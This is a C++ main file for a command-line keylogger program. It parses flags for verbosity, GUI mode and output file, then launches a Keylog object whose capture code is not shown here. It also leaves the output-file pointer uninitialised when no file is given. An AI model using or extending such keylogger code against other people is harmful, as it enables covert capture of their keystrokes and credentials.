#include "main.hh"

s_gl_env gl_env;

/**
 * Entry point for the program, everything is setup and executed from here
 *
 * Precondition: None
 * Postcondition: The program is instantiated and ran
 *
 * @param int argc The number of command line arguments
 * @param char** argv The command line argument vector
 * @return int The exit status
 */
int main(int argc, char** argv)
{
    int i;
    char* outputFile;

    signal(SIGINT, shutdown);

    if(argc < 2)
    {
        cerr << "Invalid number of command line arguments" << endl;
        usage();
        return 1;
    }

    //Parse command line arguments
    for(i = 1; i < argc; i++)
    {
        if(strcmp(argv[i], "-h") == 0)
        {
            usage();
            return 0;
        }
        else if(strcmp(argv[i], "-v") == 0)
        {
            gl_env.verboseOutput = true;
        }
        else if(strcmp(argv[i], "-g") == 0)
        {
            gl_env.gui = true;
        }
        else if(strcmp(argv[i], "-f") == 0)
        {
            outputFile = argv[i + 1];
        }
    }

    //Start keylogger
    gl_env.logger = new Keylog(outputFile);
    gl_env.logger->run();

    return 0;
}

/**
 * Print program usage
 *
 * Precondition: None
 * Postcondition: Program usage is printed
 */
void usage()
{
    cout << endl;
    cout << "Usage: " << endl;
    cout << "./keylogger [-vhgf]" << endl;
    cout << "-v Verbose output" << endl;
    cout << "-g GUI mode" << endl;
    cout << "-f fileName Specify an output file" << endl;
    cout << "-h Display this message" << endl;
}
